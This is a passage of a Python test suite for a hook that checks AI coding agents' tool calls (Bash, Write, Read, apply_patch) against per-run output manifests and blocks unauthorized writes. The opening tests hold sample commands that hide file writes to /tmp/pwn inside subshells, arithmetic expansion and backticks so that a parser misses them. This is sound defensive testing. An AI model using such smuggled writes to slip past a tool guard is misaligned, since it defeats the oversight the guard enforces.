    def test_detect_bash_write_targets_escaped_paren_inside_subshell(self) -> None:
        cmd = r'python3 foo.py --arg "$(printf \(; echo hi > /tmp/pwn)"'
        targets = cli._detect_bash_write_targets(cmd)
        self.assertIn("/tmp/pwn", targets)

    def test_detect_bash_write_targets_literal_redirect_in_quoted_string_not_detected(self) -> None:
        # Plain quoted text with > is not a redirect and must not be flagged
        cmd = 'python3 foo.py --reply-text "exit code > 0"'
        targets = cli._detect_bash_write_targets(cmd)
        self.assertEqual(targets, [])

    def test_detect_bash_write_targets_arithmetic_expansion_not_flagged(self) -> None:
        # $((1 > 0)) is arithmetic — '>' is comparison, not a redirect
        cmd = 'python3 foo.py --reply-text "$((1 > 0))"'
        targets = cli._detect_bash_write_targets(cmd)
        self.assertEqual(targets, [])

    def test_detect_bash_write_targets_arithmetic_with_nested_parens_not_flagged(self) -> None:
        cmd = 'python3 foo.py --val "$(( (a + b) > 0 ))"'
        targets = cli._detect_bash_write_targets(cmd)
        self.assertEqual(targets, [])

    def test_detect_bash_write_targets_arithmetic_plus_real_redirect(self) -> None:
        # Arithmetic inside quotes must not mask a real redirect outside quotes
        cmd = 'python3 foo.py --val "$((1 > 0))" > workspace/out.txt'
        targets = cli._detect_bash_write_targets(cmd)
        self.assertIn("workspace/out.txt", targets)
        self.assertNotIn("0", targets)

    def test_detect_bash_write_targets_nested_subst_in_arithmetic(self) -> None:
        # $(( $(echo 1 > /tmp/pwn; echo 1) + 1 )) — nested $() inside $(()) executes
        cmd = '--arg "$(( $(echo 1 > /tmp/pwn; echo 1) + 1 ))"'
        targets = cli._detect_bash_write_targets(cmd)
        self.assertIn("/tmp/pwn", targets)

    def test_detect_bash_write_targets_backtick_in_arithmetic(self) -> None:
        # $(( `echo 1 > /tmp/bt; echo 1` + 1 )) — backtick inside $(()) executes
        cmd = "$(( `echo 1 > /tmp/bt; echo 1` + 1 ))"
        targets = cli._detect_bash_write_targets(cmd)
        self.assertIn("/tmp/bt", targets)

    def test_detect_bash_write_targets_arithmetic_comparison_still_ignored(self) -> None:
        # Plain arithmetic inside quotes — $((a > b)) is comparison, not redirect
        cmd = 'python3 foo.py --val "$((a > b))"'
        targets = cli._detect_bash_write_targets(cmd)
        self.assertEqual(targets, [])

    def test_bash_write_guard_blocks_for_codex_and_claude_when_agent_run_id_unresolved(self) -> None:
        for backend in ("codex", "claude"):
            with self.subTest(backend=backend):
                with tempfile.TemporaryDirectory() as tmp:
                    repo_root = Path(tmp)
                    orch = f"orch_bash_guard_unresolved_{backend}"
                    orch_root = repo_root / "workspace" / "orchestrations" / orch
                    orch_root.mkdir(parents=True, exist_ok=True)
                    payload = {
                        "orchestration_id": orch,
                        "repo_root": str(repo_root),
                        "tool_name": "Bash",
                        "session_id": "sess_missing_001",
                        "tool_input": {"command": "echo hello > workspace/pipelines/safe/out.txt"},
                    }
                    out = io.StringIO()
                    env = {"METDSL_WORKFLOW_MODE": "1"}
                    if backend == "codex":
                        env["METDSL_REQUIRE_CODEX_HOOKS_FEATURE"] = "0"
                    with patch.dict(os.environ, env, clear=False):
                        with redirect_stdout(out):
                            code = cli.main(
                                [
                                    "--backend",
                                    backend,
                                    "--event",
                                    "PreToolUse",
                                    "--input-json",
                                    json.dumps(payload),
                                ]
                            )
                    self.assertEqual(code, 2)
                    body = json.loads(out.getvalue().strip())
                    self.assertEqual(body.get("decision"), "block")
                    if backend == "codex":
                        self.assertIn("session-to-run mapping not found", body.get("reason", ""))
                    else:
                        reason = body.get("reason", "")
                        self.assertTrue(
                            (
                                "active child agent_run_id is empty" in reason
                                or "no orchestration_agent_run_id found" in reason
                            ),
                            msg=reason,
                        )

    def test_claude_backend_does_not_require_codex_hooks_feature(self) -> None:
        """Claude backend must not invoke the Codex feature probe at all."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root_path = Path(tmp)
            payload = {
                "orchestration_id": "orch_claude_noprobe_001",
                "repo_root": str(repo_root_path),
                "tool_name": "Bash",
                "tool_input": {"command": "echo hi"},
            }
            with patch("tools.hooks.cli.read_codex_feature_cache") as probe_mock:
                probe_mock.side_effect = AssertionError("codex feature cache must not be read for claude")
                out = io.StringIO()
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "claude",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
                self.assertEqual(code, 0)
                self.assertEqual(out.getvalue().strip(), "")

    def test_claude_backend_falls_back_to_global_without_policy(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root_path = Path(tmp)
            payload = {
                "repo_root": str(repo_root_path),
                "tool_name": "WebSearch",
                "tool_input": {"query": "workflow status"},
            }
            out = io.StringIO()
            with redirect_stdout(out):
                code = cli.main(
                    [
                        "--backend",
                        "claude",
                        "--event",
                        "PreToolUse",
                        "--input-json",
                        json.dumps(payload),
                    ]
                )
            self.assertEqual(code, 0)
            log_path = (
                repo_root_path
                / "workspace"
                / "orchestrations"
                / "_global"
                / "hooks"
                / "native_hook_events.jsonl"
            )
            self.assertFalse(log_path.exists())

    def test_claude_global_audit_uses_metdsl_hook_repo_root_env(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root_path = Path(tmp)
            payload = {
                "tool_name": "Bash",
                "tool_input": {"command": "echo hi"},
            }
            with patch.dict(os.environ, {"METDSL_HOOK_REPO_ROOT": str(repo_root_path)}):
                out = io.StringIO()
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "claude",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
                self.assertEqual(code, 0)
            log_path = (
                repo_root_path
                / "workspace"
                / "orchestrations"
                / "_global"
                / "hooks"
                / "native_hook_events.jsonl"
            )
            self.assertFalse(log_path.exists())

    def test_claude_backend_settings_json_command_works(self) -> None:
        repo_root = Path(__file__).resolve().parents[2]
        settings_doc = json.loads(
            (repo_root / ".claude" / "settings.json").read_text(encoding="utf-8")
        )
        with tempfile.TemporaryDirectory() as tmp:
            command = (
                settings_doc["hooks"]["PreToolUse"][0]["hooks"][0]["command"]
                .replace(
                    'METDSL_HOOK_REPO_ROOT="$ROOT"',
                    f'METDSL_HOOK_REPO_ROOT="{tmp}"',
                )
                .replace('--repo-root "$ROOT"', f'--repo-root "{tmp}"')
            )
            payload = {
                "orchestration_id": "orch_claude_settings_001",
                "repo_root": tmp,
                "tool_name": "Bash",
                "tool_input": {"command": "echo hello"},
            }
            proc = subprocess.run(
                command,
                cwd=str(repo_root / "tools"),
                text=True,
                capture_output=True,
                input=json.dumps(payload),
                shell=True,
                check=False,
            )
            self.assertEqual(proc.returncode, 0)
            # Strip shell-profile noise (e.g. nvm banner from `sh -lc`) before asserting.
            hook_lines = [l for l in proc.stdout.splitlines() if l.strip() not in {"nvm", ""}]
            self.assertEqual(hook_lines, [])

    def test_resolve_repo_root_uses_metdsl_hook_repo_root_env(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            with patch.dict(os.environ, {"METDSL_HOOK_REPO_ROOT": tmp}):
                for backend in ("claude", "codex"):
                    result = cli._resolve_repo_root({}, backend=backend)
                    self.assertEqual(result, Path(tmp).resolve())

    def test_claude_backend_user_prompt_submit_uses_global_without_orchestration_id(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root_path = Path(tmp)
            payload = {"repo_root": str(repo_root_path), "prompt": "do something"}
            out = io.StringIO()
            with redirect_stdout(out):
                code = cli.main(
                    [
                        "--backend",
                        "claude",
                        "--event",
                        "UserPromptSubmit",
                        "--input-json",
                        json.dumps(payload),
                    ]
                )
            self.assertEqual(code, 0)
            log_path = (
                repo_root_path
                / "workspace"
                / "orchestrations"
                / "_global"
                / "hooks"
                / "native_hook_events.jsonl"
            )
            self.assertFalse(log_path.exists())

    def test_strict_policy_allows_missing_orchestration_id_as_global(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root_path = Path(tmp)
            payload = {
                "repo_root": str(repo_root_path),
                "tool_name": "WebSearch",
                "tool_input": {"query": "workflow status"},
            }
            with patch.dict(
                os.environ,
                {"METDSL_MISSING_ORCHESTRATION_ID_POLICY": "strict"},
            ):
                out = io.StringIO()
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "claude",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
                self.assertEqual(code, 0)
                self.assertEqual(out.getvalue().strip(), "")

    def test_workflow_mode_accepts_orchestration_id_from_environment(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root_path = Path(tmp)
            payload = {
                "repo_root": str(repo_root_path),
                "tool_name": "WebSearch",
                "tool_input": {"query": "workflow status"},
            }
            with patch.dict(
                os.environ,
                {
                    "METDSL_WORKFLOW_MODE": "1",
                    "METDSL_ORCHESTRATION_ID": "orch_env_001",
                    "METDSL_REQUIRE_CODEX_HOOKS_FEATURE": "0",
                },
            ):
                code = cli.main(
                    [
                        "--backend",
                        "codex",
                        "--event",
                        "PreToolUse",
                        "--input-json",
                        json.dumps(payload),
                    ]
                )
            self.assertEqual(code, 0)
            log_path = (
                repo_root_path
                / "workspace"
                / "orchestrations"
                / "orch_env_001"
                / "hooks"
                / "native_hook_events.jsonl"
            )
            self.assertTrue(log_path.is_file())

    def test_missing_orchestration_id_allowed_when_workflow_mode_disabled(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root_path = Path(tmp)
            payload = {
                "repo_root": str(repo_root_path),
                "tool_name": "Bash",
                "tool_input": {
                    "command": "python3 tools/orchestration_runtime.py run-gate --gate orchestration_read"
                },
            }
            with patch.dict(
                os.environ,
                {
                    "METDSL_WORKFLOW_MODE": "0",
                    "METDSL_REQUIRE_CODEX_HOOKS_FEATURE": "0",
                },
            ):
                code = cli.main(
                    [
                        "--backend",
                        "codex",
                        "--event",
                        "PreToolUse",
                        "--input-json",
                        json.dumps(payload),
                    ]
                )
            self.assertEqual(code, 0)
            log_path = (
                repo_root_path
                / "workspace"
                / "orchestrations"
                / "_global"
                / "hooks"
                / "native_hook_events.jsonl"
            )
            self.assertFalse(log_path.exists())

    def test_claude_file_tool_blocks_write_outside_manifest_when_active_child_exists(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_file_guard_001"
            run_id = "step_run_build_001"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            (orch_root / "output_manifests").mkdir(parents=True, exist_ok=True)
            (orch_root / "read_manifests").mkdir(parents=True, exist_ok=True)
            (orch_root / "active_child_agent_run_id.txt").write_text(run_id, encoding="utf-8")
            (orch_root / "output_manifests" / f"{run_id}.json").write_text(
                json.dumps({
                    "allowed_output_paths": ["workspace/pipelines/safe/out.txt"],
                    "allowed_file_tool_paths": ["workspace/pipelines/safe/out.txt"],
                }),
                encoding="utf-8",
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Write",
                "tool_input": {"file_path": "workspace/forbidden.txt"},
            }
            out = io.StringIO()
            with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": "1"}, clear=False):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "claude",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 2)
            body = json.loads(out.getvalue().strip())
            self.assertEqual(body.get("decision"), "block")
            self.assertIn("unauthorized write", body.get("reason", ""))
            self.assertIn("Edit/Write", body.get("reason", ""))

    def test_claude_read_allows_self_output_and_read_manifest_without_allowed_root(self) -> None:
        """The output/read manifest can be Read even if not in allowed_read_roots."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_manifest_read_001"
            run_id = "child_run_manifest_001"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            (orch_root / "output_manifests").mkdir(parents=True, exist_ok=True)
            (orch_root / "read_manifests").mkdir(parents=True, exist_ok=True)
            (orch_root / "active_child_agent_run_id.txt").write_text(run_id, encoding="utf-8")
            (orch_root / "output_manifests" / f"{run_id}.json").write_text(
                json.dumps({
                    "allowed_output_paths": ["workspace/pipelines/safe/out.txt"],
                    "allowed_file_tool_paths": ["workspace/pipelines/safe/out.txt"],
                }),
                encoding="utf-8",
            )
            (orch_root / "read_manifests" / f"{run_id}.json").write_text(
                json.dumps({"allowed_read_roots": ["docs/"]}),
                encoding="utf-8",
            )
            out_manifest_rel = f"workspace/orchestrations/{orch}/output_manifests/{run_id}.json"
            read_manifest_rel = f"workspace/orchestrations/{orch}/read_manifests/{run_id}.json"
            for target in (out_manifest_rel, read_manifest_rel):
                payload = {
                    "orchestration_id": orch,
                    "repo_root": str(repo_root),
                    "tool_name": "Read",
                    "tool_input": {"file_path": target},
                }
                out = io.StringIO()
                with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": "1"}, clear=False):
                    with redirect_stdout(out):
                        code = cli.main(
                            [
                                "--backend",
                                "claude",
                                "--event",
                                "PreToolUse",
                                "--input-json",
                                json.dumps(payload),
                            ]
                        )
                self.assertEqual(code, 0, msg=f"expected allow for {target!r}")
                raw = out.getvalue().strip()
                if raw:
                    body = json.loads(raw)
                    self.assertEqual(body.get("decision"), "allow", msg=target)

    def test_codex_file_tool_resolves_session_to_agent_run_and_allows_manifest_path(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_file_guard_002"
            run_id = "step_run_build_001"
            session_id = "sess_step_build_001"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            (orch_root / "output_manifests").mkdir(parents=True, exist_ok=True)
            (orch_root / "read_manifests").mkdir(parents=True, exist_ok=True)
            (orch_root / "output_manifests" / f"{run_id}.json").write_text(
                json.dumps({
                    "allowed_output_paths": ["workspace/pipelines/safe/out.txt"],
                    "allowed_file_tool_paths": ["workspace/pipelines/safe/out.txt"],
                }),
                encoding="utf-8",
            )
            (orch_root / "agent_runs.jsonl").write_text(
                json.dumps(
                    {
                        "agent_run_id": run_id,
                        "agent_backend": "codex",
                        "agent_session_id": session_id,
                    }
                )
                + "\n",
                encoding="utf-8",
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Write",
                "session_id": session_id,
                "tool_input": {"file_path": "workspace/pipelines/safe/out.txt"},
            }
            with patch.dict(
                os.environ,
                {"METDSL_WORKFLOW_MODE": "1", "METDSL_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                clear=False,
            ):
                code = cli.main(
                    [
                        "--backend",
                        "codex",
                        "--event",
                        "PreToolUse",
                        "--input-json",
                        json.dumps(payload),
                    ]
                )
            self.assertEqual(code, 0)

    def test_codex_file_tool_allows_with_session_run_index_before_agent_runs_recorded(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_file_guard_index_001"
            run_id = "step_run_build_index_001"
            session_id = "sess_step_build_index_001"
            target = "workspace/pipelines/safe/out.txt"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            (orch_root / "output_manifests").mkdir(parents=True, exist_ok=True)
            (orch_root / "session_run_index.json").write_text(
                json.dumps(
                    {
                        "entries": [
                            {
                                "agent_run_id": run_id,
                                "agent_session_id": session_id,
                                "session_id": session_id,
                                "context_id": "ctx_step_build_index_001",
                                "agent_role": "step",
                                "status": "running",
                            }
                        ]
                    }
                ),
                encoding="utf-8",
            )
            (orch_root / "output_manifests" / f"{run_id}.json").write_text(
                json.dumps(
                    {
                        "orchestration_id": orch,
                        "agent_run_id": run_id,
                        "allowed_output_paths": [target],
                        "allowed_file_tool_paths": [target],
                    }
                ),
                encoding="utf-8",
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Write",
                "session_id": session_id,
                "tool_input": {"file_path": target},
            }
            with patch.dict(
                os.environ,
                {"METDSL_WORKFLOW_MODE": "1", "METDSL_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                clear=False,
            ):
                code = cli.main(
                    [
                        "--backend",
                        "codex",
                        "--event",
                        "PreToolUse",
                        "--input-json",
                        json.dumps(payload),
                    ]
                )
            self.assertEqual(code, 0)

    def test_codex_file_tool_blocks_when_session_run_index_is_ambiguous(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_file_guard_index_ambiguous_001"
            session_id = "sess_step_build_index_ambiguous_001"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            orch_root.mkdir(parents=True, exist_ok=True)
            (orch_root / "session_run_index.json").write_text(
                json.dumps(
                    {
                        "entries": [
                            {
                                "agent_run_id": "step_run_ambiguous_001",
                                "agent_session_id": session_id,
                                "session_id": session_id,
                                "agent_role": "step",
                                "status": "running",
                            },
                            {
                                "agent_run_id": "step_run_ambiguous_002",
                                "agent_session_id": session_id,
                                "session_id": session_id,
                                "agent_role": "step",
                                "status": "running",
                            },
                        ]
                    }
                ),
                encoding="utf-8",
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Write",
                "session_id": session_id,
                "tool_input": {"file_path": "workspace/pipelines/safe/out.txt"},
            }
            out = io.StringIO()
            with patch.dict(
                os.environ,
                {"METDSL_WORKFLOW_MODE": "1", "METDSL_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                clear=False,
            ):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "codex",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 2)
            body = json.loads(out.getvalue().strip())
            self.assertEqual(body.get("decision"), "block")
            self.assertIn("session-to-run mapping not found", body.get("reason", ""))
            self.assertIn("ambiguous candidates=2", body.get("reason", ""))

    def test_codex_file_tool_resolves_in_place_resume_to_running_owner(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_file_guard_in_place_resume_001"
            session_id = "thread_in_place_resume_001"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            orch_root.mkdir(parents=True, exist_ok=True)
            (orch_root / "session_run_index.json").write_text(
                json.dumps({"entries": [
                    {"agent_run_id": "prior_run", "agent_session_id": session_id,
                     "session_id": session_id, "status": "fail"},
                    {"agent_run_id": "repair_run", "agent_session_id": session_id,
                     "session_id": session_id, "status": "running"},
                ]}),
                encoding="utf-8",
            )
            resolved, candidates = cli._resolve_codex_agent_run_id_from_session(
                repo_root=repo_root, orchestration_id=orch,
                session_id=session_id, agent_session_id=None,
            )
            self.assertEqual(resolved, "repair_run")
            self.assertEqual(candidates, 1)

    def test_codex_file_tool_does_not_match_none_literal_from_missing_context_id(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_file_guard_index_none_literal_001"
            run_id = "step_run_none_literal_001"
            target = "workspace/pipelines/safe/out.txt"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            (orch_root / "output_manifests").mkdir(parents=True, exist_ok=True)
            (orch_root / "session_run_index.json").write_text(
                json.dumps(
                    {
                        "entries": [
                            {
                                "agent_run_id": run_id,
                                "agent_session_id": "sess_real_001",
                                "context_id": None,
                                "agent_role": "step",
                                "status": "running",
                            }
                        ]
                    }
                ),
                encoding="utf-8",
            )
            (orch_root / "output_manifests" / f"{run_id}.json").write_text(
                json.dumps(
                    {
                        "orchestration_id": orch,
                        "agent_run_id": run_id,
                        "allowed_output_paths": [target],
                        "allowed_file_tool_paths": [target],
                    }
                ),
                encoding="utf-8",
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Write",
                "session_id": "None",
                "tool_input": {"file_path": target},
            }
            out = io.StringIO()
            with patch.dict(
                os.environ,
                {"METDSL_WORKFLOW_MODE": "1", "METDSL_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                clear=False,
            ):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "codex",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 2)
            body = json.loads(out.getvalue().strip())
            self.assertEqual(body.get("decision"), "block")
            self.assertIn("session-to-run mapping not found", body.get("reason", ""))

    def test_codex_file_tool_blocks_when_session_mapping_not_found(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_file_guard_003"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            orch_root.mkdir(parents=True, exist_ok=True)
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Read",
                "session_id": "sess_unknown_001",
                "tool_input": {"file_path": "workspace/pipelines/safe/out.txt"},
            }
            out = io.StringIO()
            with patch.dict(
                os.environ,
                {"METDSL_WORKFLOW_MODE": "1", "METDSL_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                clear=False,
            ):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "codex",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 2)
            body = json.loads(out.getvalue().strip())
            self.assertEqual(body.get("decision"), "block")
            self.assertIn("session-to-run mapping not found", body.get("reason", ""))
            self.assertIn("orchestration_read", body.get("reason", ""))

    def test_codex_write_tool_blocks_with_write_hint_when_session_mapping_not_found(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_file_guard_004"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            orch_root.mkdir(parents=True, exist_ok=True)
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Write",
                "session_id": "sess_unknown_002",
                "tool_input": {"file_path": "workspace/pipelines/safe/out.txt"},
            }
            out = io.StringIO()
            with patch.dict(
                os.environ,
                {"METDSL_WORKFLOW_MODE": "1", "METDSL_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                clear=False,
            ):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "codex",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 2)
            body = json.loads(out.getvalue().strip())
            self.assertEqual(body.get("decision"), "block")
            self.assertIn("session-to-run mapping not found", body.get("reason", ""))
            self.assertIn("Edit/Write", body.get("reason", ""))
            self.assertNotIn("orchestration_read", body.get("reason", ""))

    def test_codex_raw_apply_patch_allows_when_target_is_in_allowed_file_tool_paths(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_apply_patch_guard_001"
            run_id = "step_run_apply_patch_001"
            session_id = "sess_apply_patch_001"
            target_path = "workspace/pipelines/safe/notes.md"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            (orch_root / "output_manifests").mkdir(parents=True, exist_ok=True)
            (orch_root / "agent_runs.jsonl").write_text(
                json.dumps(
                    {
                        "agent_run_id": run_id,
                        "agent_backend": "codex",
                        "agent_session_id": session_id,
                    }
                )
                + "\n",
                encoding="utf-8",
            )
            (orch_root / "output_manifests" / f"{run_id}.json").write_text(
                json.dumps(
                    {
                        "orchestration_id": orch,
                        "agent_run_id": run_id,
                        "allowed_output_paths": [target_path],
                        "allowed_file_tool_paths": [target_path],
                        "write_roots": ["workspace/pipelines/safe"],
                    }
                ),
                encoding="utf-8",
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "apply_patch",
                "session_id": session_id,
                "tool_input": {
                    "command": (
                        "*** Begin Patch\n"
                        f"*** Add File: {target_path}\n"
                        "+notes\n"
                        "*** End Patch\n"
                    )
                },
            }
            out = io.StringIO()
            with patch.dict(
                os.environ,
                {"METDSL_WORKFLOW_MODE": "1", "METDSL_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                clear=False,
            ):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "codex",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 0)
            body_text = out.getvalue().strip()
            if body_text:
                body = json.loads(body_text)
                self.assertEqual(body.get("decision"), "allow")
            log_path = (
                repo_root
                / "workspace"
                / "orchestrations"
                / orch
                / "hooks"
                / "native_hook_events.jsonl"
            )
            entry = json.loads(log_path.read_text(encoding="utf-8").splitlines()[-1])
            self.assertEqual(entry.get("tool_name"), "apply_patch")
            self.assertEqual(
                entry.get("payload_summary", {}).get("apply_patch_paths"),
                [target_path],
            )
            self.assertEqual(entry.get("payload_summary", {}).get("patch_line_count"), 4)

    def test_codex_raw_apply_patch_allows_when_session_id_matches_context_id(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_apply_patch_guard_001_context_fallback"
            run_id = "step_run_apply_patch_context_001"
            context_id = "ctx_apply_patch_001"
            target_path = "workspace/pipelines/safe/spec.ir.yaml"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            (orch_root / "output_manifests").mkdir(parents=True, exist_ok=True)
            (orch_root / "agent_runs.jsonl").write_text(
                json.dumps(
                    {
                        "agent_run_id": run_id,
                        "agent_backend": "codex",
                        "agent_session_id": "sess_unrelated_001",
                        "context_id": context_id,
                    }
                )
                + "\n",
                encoding="utf-8",
            )
            (orch_root / "output_manifests" / f"{run_id}.json").write_text(
                json.dumps(
                    {
                        "orchestration_id": orch,
                        "agent_run_id": run_id,
                        "allowed_output_paths": [target_path],
                        "allowed_file_tool_paths": [target_path],
                        "write_roots": ["workspace/pipelines/safe"],
                    }
                ),
                encoding="utf-8",
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "apply_patch",
                "session_id": context_id,
                "tool_input": {
                    "patch": (
                        "*** Begin Patch\n"
                        f"*** Add File: {target_path}\n"
                        "+case: resolved\n"
                        "*** End Patch\n"
                    )
                },
            }
            out = io.StringIO()
            with patch.dict(
                os.environ,
                {"METDSL_WORKFLOW_MODE": "1", "METDSL_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                clear=False,
            ):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "codex",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 0)
            body_text = out.getvalue().strip()
            if body_text:
                body = json.loads(body_text)
                self.assertEqual(body.get("decision"), "allow")

    def test_codex_raw_apply_patch_blocks_when_context_id_mapping_is_ambiguous(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_apply_patch_guard_ambiguous_context"
            context_id = "ctx_apply_patch_ambiguous_001"
            target_path = "workspace/pipelines/safe/spec.ir.yaml"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            (orch_root / "output_manifests").mkdir(parents=True, exist_ok=True)
            (orch_root / "agent_runs.jsonl").write_text(
                "\n".join(
                    [
                        json.dumps(
                            {
                                "agent_run_id": "step_run_apply_patch_context_ambiguous_001",
                                "agent_backend": "codex",
                                "agent_session_id": "sess_unrelated_ambiguous_001",
                                "context_id": context_id,
                            }
                        ),
                        json.dumps(
                            {
                                "agent_run_id": "step_run_apply_patch_context_ambiguous_002",
                                "agent_backend": "codex",
                                "agent_session_id": "sess_unrelated_ambiguous_002",
                                "context_id": context_id,
                            }
                        ),
                    ]
                )
                + "\n",
                encoding="utf-8",
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "apply_patch",
                "session_id": context_id,
                "tool_input": {
                    "patch": (
                        "*** Begin Patch\n"
                        f"*** Add File: {target_path}\n"
                        "+case: ambiguous\n"
                        "*** End Patch\n"
                    )
                },
            }
            out = io.StringIO()
            with patch.dict(
                os.environ,
                {"METDSL_WORKFLOW_MODE": "1", "METDSL_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                clear=False,
            ):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "codex",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 2)
            body = json.loads(out.getvalue().strip())
            self.assertEqual(body.get("decision"), "block")
            self.assertIn("session-to-run mapping not found", body.get("reason", ""))

    def test_codex_raw_apply_patch_audit_logs_target_paths(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_apply_patch_audit_001"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            orch_root.mkdir(parents=True, exist_ok=True)
            patch_text = "\n".join(
                [
                    "*** Begin Patch",
                    "*** Add File: workspace/ir/p/ir_meta.json",
                    "+{}",
                    "*** Update File: workspace/ir/p/spec.ir.yaml",
                    "@@",
                    "+case: ok",
                    "*** End Patch",
                    "",
                ]
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "apply_patch",
                "tool_input": {"patch": patch_text},
            }
            out = io.StringIO()
            with patch.dict(
                os.environ,
                {"METDSL_WORKFLOW_MODE": "1", "METDSL_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                clear=False,
            ):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "codex",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 2)
            log_path = (
                repo_root
                / "workspace"
                / "orchestrations"
                / orch
                / "hooks"
                / "native_hook_events.jsonl"
            )
            entry = json.loads(log_path.read_text(encoding="utf-8").splitlines()[-1])
            self.assertEqual(
                entry.get("payload_summary", {}).get("apply_patch_paths"),
                [
                    "workspace/ir/p/ir_meta.json",
